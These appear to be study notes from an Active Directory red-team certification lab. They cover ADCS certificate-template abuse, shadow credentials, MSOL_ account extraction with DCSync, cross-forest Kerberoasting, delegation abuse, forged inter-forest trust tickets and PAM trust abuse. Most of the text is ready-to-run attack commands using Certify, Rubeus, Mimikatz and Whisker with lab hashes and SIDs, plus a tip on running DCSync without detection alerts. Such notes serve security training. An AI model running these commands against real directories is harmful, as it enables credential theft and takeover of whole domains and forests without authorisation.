# ADCS

Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.

> AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.

> *AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization*.

- **CA** - The certification authority that issues certificates. The server with AD CS role (DC or separate) is the CA.
- **Certificate** - Issued to a user or machine and can be used for authentication, encryption, signing etc.
- **CSR** - Certificate Signing Request made by a client to the CA to request a certificate.
- **Certificate Template** - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc.
- **EKU OIDs** - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.)

We can use the Certify tool to enumerate (and for other attacks) AD CS in the target forest:

[Certify on GitHub](https://github.com/GhostPack/Certify)

```powershell
Certify.exe cas
```

Enumerate the templates:
```powershell
Certify.exe find
```

Enumerate vulnerable templates:
```powershell
Certify.exe find /vulnerable
```

Common requirements/misconfigurations for all the Escalations:
```
- CA grants normal/low-privileged users enrollment rights
- Manager approval is disabled
- Authorization signatures are not required
- The target template grants normal/low-privileged users enrollment rights
```

## Escalation

- In techcorp, the user pawadmin has enrollment rights to a template **-ForAdminsofPrivilegedAccessWorkstations**
- The template has **ENROLLEE_SUPPLIES_SUBJECT** value for msPKI-Certificates-Name-Flag. (**ESC1**)
- This means pawadmin can request certificate for ANY user.

Note that this does not show up when we enumerate vulnerable templates in Certify. Use:
```powershell
Certify.exe find
Certify.exe find /enrolleeSuppliesSubject
```

- We have the certificate of pawadmin that we extracted from us-jump. (**THEFT4**)

Use the certificate to request a TGT for pawadmin and inject it:
```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
```


## Escalation to DA

Request a certificate for DA!
```powershell
C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
```

Convert from cert.pem to pfx:
```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx
```

Request DA TGT and inject it:
```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt
```


## Escalation to EA

Request a certificate for EA!
```powershell
C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
```

Convert from cert.pem to pfx:
```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\EA.pfx
```

Request EA TGT and inject it:
```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:SecretPass@123 /nowrap /ptt
```



# Shadow Credentials

Users and Computers have **msDS-KeyCredentialLink** attribute that contains the raw public keys of certificate that can be used as an alternate credential.

- This attribute is used when we configure Windows Hello for Business (WHfB)

> By default, Key Admins and Enterprise Key Admins have rights to modify the **msDS-KeyCredentialLink attribute**.

- User to User (U2U) Service Ticket can be requested to decrypt the encrypted **NTLM_SUPPLEMENTAL_CREDENTIAL** entity from Privilege Attribute Certificate (PAC) and extract NTLM hash.

Pre-requisites to abuse Shadow Credentials:
```
- AD CS (Key Trust if AD CS is not present)
- Support for PKINIT and at least one DC with Windows Server 2016 or above.
- Permissions (GenericWrite/GenericAll) to modify the msDS-KeyCredentialLink attribute of the target object.
```

## Abusing User Object

Enumerate the permissions:
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
```

Add the Shadow Credential:
```powershell
Whisker.exe add /target:supportXuser
```

Using PowerView, see if the Shadow Credential is added.
```powershell
Get-DomainUser -Identity supportXuser
```


Request the TGT by leveraging the certificate:
```powershell
Rubeus.exe asktgt /user:supportXuser /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW.... /password:"1OT0qAom3..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show /nowrap
```

Inject the TGT in the current session or use the NTLM hash:
```powershell
Rubeus.exe ptt /ticket:doIGgDCCBnygAwIBBaEDAgEW...
```

## Abusing Computer Object

Enumerate the permissions:
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin’}
```

Add the Shadow Credentials:
```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /run:cmd.exe" "exit"
Whisker.exe add /target:us-helpdesk$
```

Using PowerView, see if the Shadow Credential is added:
```powershell
Get-DomainComputer -Identity us-helpdesk
```

Request the TGT by leveraging the certificate:
```powershell
Rubeus.exe asktgt /user:us-helpdesk$ /certificate:MIIJ0AIBAzCCCYwGCSqGSIb... /password:"ViGFoZJa..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show
```

Request and Inject the TGS by impersonating the user:
```powershell
Rubeus.exe s4u /dc:us-dc.us.techcorp.local /ticket:doIGkDCCBoygAwIBBaEDAgEW... /impersonateuser:administrator /ptt /self /altservice:cifs/us-helpdesk
```



# Azure AD Integration

Azure AD is a popular method to extend identity management from on-premises AD to Microsoft's Azure offerings.

- Many enterprises use their on-prem AD identities to access Azure applications.

> A single user identity for authentication and authorization to all resources, regardless of location is hybrid identity.

An on-premises AD can be integrated with Azure AD using Azure AD Connect with the following methods:
```
- Password Hash Sync (PHS)
- Pass-Through Authentication (PTA)
- Federation
```

> Azure AD Connect is installed on-premises and has a high privilege account both in on AD and Azure AD!


## PHS

> Let's target PHS.

- It shares users and their password hashes from on-premises AD to Azure AD.
- A new users **MSOL_** is created which has Synchronization rights (DCSync) on the domain!

![Alt text](/assets/images/posts/crte/3.png){: .align-center}




**Enumerate the PHS account and server where AD Connect is installed**

Using PowerView:
```powershell
Get-DomainUser -Identity "MSOL_*" -Domain techcorp.local
```

Using the ActiveDirectory module:
```powershell
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName,Description | fl
```

> We already have administrative access to us-adconnect as helpdeskadmin.

With administrative privileges, if we run adconnect.ps1, we can extract the credentials of the MSOL_ account used by AD Connect in clear-text:
```powershell
.\adconnect.ps1
```

> [Note] The above script's code runs powershell.exe so verbose logs (like transcripts) will be there.

With the password, we can run commands as **MSOL_**:
```powershell
runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd
```

And can then execute the DCSync attack:
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local"'
```

> [NOTE] Because AD Connect synchronizes hashes every two minutes, in an Enterprise Environment, the **MSOL_** account will be **excluded from tools like MDI**! 

> This will allow us to run DCSync without any alerts!



# Forest Root

- Child to Forest Root - Trust Key
- Child to Forest Root - krbtgt

same material of CRTP:

[CRTP - Privesc Across Trusts](https://johnermac.github.io/notes/crtp/domprivesc/#privesc---across-trusts)


 

# Kerberoast across Forest Trusts

> It is possible to execute Kerberoast across Forest trusts.

**Let's enumerate named service accounts across forest trusts**

Using PowerView:
```powershell
Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName}
```

Using ActiveDirectory Module:
```powershell
Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name}
```

Request a TGS:
```powershell
C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:euhashes.txt
```

Check for the TGS:
```powershell
klist
```

Crack using John:
```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

Request TGS across trust using PowerShell:
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/eu-file.eu.local@eu.local
```

# Delegations

## Constrained Delegation with Protocol Transition

> The classic Constrained Delegation does not work across forest trusts.
But we can abuse it once we have a foothold across forest trust.

Using PowerView:
```powershell
Get-DomainUser –TrustedToAuth -Domain eu.local
Get-DomainComputer –TrustedToAuth -Domain eu.local
```

Using ActiveDirectory module:
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server domain.local
```

We can request an alternate ticket using Rubeus:
```powershell
C:\AD\Tools\Rubeus.exe hash /password:Qwerty@2019 /user:storagesvc /domain:domain.local
C:\AD\Tools\Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:domain.local /msdsspn:nmagent/dc.domain.local /altservice:ldap /dc:dc.domain.local /ptt
```

Abuse the TGS to LDAP:
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local"'
```
Or
```powershell
C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\krbtgt --Domain domain.local --DomainController dc.domain.local
C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\administrator --Domain domain.local --DomainController dc.domain.local
```



## Unconstrained Delegation

> Recall the Printer bug and its abuse from a machine with Unconstrained Delegation

- We have used it to escalate privileges to Domain Admin and Enterprise Admin.
- It also works across a Two-way forest trust with TGT Delegation enabled!

> TGT Delegation is disabled by default and must be explicitly enabled across a trust for the trusted (target) forest.

To enumerate if TGTDelegation is enabled across a forest trust, run the below command from a DC 
 ```powershell
netdom trust trustingforest /domain:trustedforest /EnableTgtDelegation
```

In the lab, this is to be run on usvendor-dc
```powershell
netdom trust usvendor.local /domain:techcorp.local /EnableTgtDelegation
```

The PowerShell cmdlets of the ADModule seems to have a bug, the below command shows TGTDelegation set to False:
```powershell
Get-ADTrust -server usvendor.local -Filter *
```

> But when run from usvendor-dc, it shows TGTDelegation to be True



# Across Forest using Trust Tickets

> By abusing the trust flow between forests in a two way trust, it is possible to access resources across the forest boundary.

- We can use the Trust Key, the same way as in Domain trusts but we can access only those resources which are explicitly shared with our current forest.
- Let's try to access a file share 'eushare' on euvendor-dc of euvendor.local forest from eu.local which is explicitly shared with Domain Admins of eu.local.

> *There is content about this in CRTP*

Like intra forest scenario, we require the trust key for the inter-forest trust:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
```
or
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:eu\euvendor$"'
```
or
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

> We can also use any of the earlier discussed tools to extract trust keys.

An inter-forest TGT can be forged:
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt
	/target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi"'
```

Get a TGS for a service (CIFS below) in the target forest by using the forged trust ticket:
```powershell
.\asktgs.exe C:\AD\Tools\kekeo_old\sharedwitheu.kirbi CIFS/euvendor-dc.euvendor.local
```

> Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well

Use the TGS to access the target resource which must be explicitly shared:
```powershell
.\kirbikator.exe lsa CIFS.euvendor-dc.euvendor.local.kirbi
ls \\euvendor-dc.euvendor.local\eushare\
```

We can also use Rubeus:
```powershell
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\sharedwitheu.kirbi /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
```

- This is fine but why can't we access all resources just like Intra forest?
- **SID Filtering** is the answer. 
- It filters high privilege SIDs from the **SIDHistory** of a TGT crossing forest boundary. 
- This means we cannot just go ahead and access resources in the trusting forest as an Enterprise Admin.

> But there is a catch:

![Alt text](/assets/images/posts/crte/4.png){: .align-center}


Reference: 

[MS-PAC: Privilege Attribute Certificate Data Structure](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)


> This means, if we have an external trust (or a forest trust with SID history enabled -/enablesidhistory:yes), we can inject a **SIDHistory for RID > 1000** to access resources accessible to that identity or group in the target trusting forest.

We had DA access to eu.local. Let's enumerate trusts from a PSRemoting session on eu-dc:
```powershell
Get-ADTrust -Filter *
```

- **SIDFilteringForestAware** is set to **True**, it means SIDHistory is enabled across the forest trust.

Please remember that still only RID > 1000 SIDs will be allowed across the trust boundary:
```powershell
Get-ADGroup -Identity EUAdmins -Server euvendor.local
```

From eu-dc, create a TGT with SIDHistory of EUAdmins group:
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt
/target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /ticket:C:\Users\Public\euvendornet.kirbi"'
```

Request a TGS:
```powershell
.\asktgs.exe C:\Users\Public\euvendornet.kirbi HTTP/euvendor-net.euvendor.local
```

Inject that into current session:
```powershell
.\kirbikator.exe lsa HTTP.euvendor-net.euvendor.local.kirbi
```
Or
```powershell
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\euvendornet.kirbi /service:HTTP/euvendor-net.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
```

Access the euvendor-net machine using PSRemoting:
```powershell
Invoke-Command -ScriptBlock{whoami} -ComputerName euvendor-net.euvendor.local -Authentication NegotiateWithImplicitCredential
```



# Trust Abuse (MSSQL Servers)

Same material as in the CRTP:

[CRTP - Trust Abuse (MSSQL Servers)](https://johnermac.github.io/notes/crtp/domprivesc/#trust-abuse---mssql-servers)


# Foreign Security Principals

> A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users, Enterprise DCs etc.).

- Only SID of a FSP is stored in the Foreign Security Principal Container which can be resolved using the trust relationship.
- FSP allows external principals to be added to domain local security groups. Thus, allowing such principals to access resources in the forest.
- Often, FSPs are ignored, mis-configured or too complex to change/cleanup in an enterprise making them ripe for abuse.

PowerView:
```powershell
Find-ForeignGroup -Verbose
Find-ForeignUser -Verbose
```

Using ActiveDirectory module:
```powershell
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"}
```

- Access to resources in a forest trust can also be provided without using FSPs using ACLs.
- Principals added to ACLs do NOT show up in the ForeignSecurityPrinicpals container as the container is populated only when a principal is added to a domain local security group

Let's enumerate ACLs for the dbvendor.local domain using the reverse shell we have on db.local:
```powershell
Find-InterestingDomainAcl -Domain dbvendor.local
```



# Abusing PAM Trust

> PAM trust is usually enabled between a Bastion or Red forest and a production/user forest which it manages.

- PAM trust provides the ability to access the production forest with high privileges without using credentials of the bastion forest. Thus, better security for the bastion forest which is much desired.
- To achieve the above, Shadow Principals are created in the bastion domain which are then mapped to DA or EA groups SIDs in the production forest.

> By enumerating trusts and hunting for access, we can enumerate that we have Administrative access in other forest.

From techcorp-dc:
```powershell
Get-ADTrust -Filter *
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
```

On bastion-dc, enumerate if there is a PAM trust:
```powershell
$bastiondc = New-PSSession bastion-dc.bastion.local
Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}} -Session $bastiondc
```

Check which users are members of the Shadow Principals:
```powershell
Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $bastiondc
```

Establish a direct PSRemoting session on bastion-dc and access production.local:
```powershell
Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
```
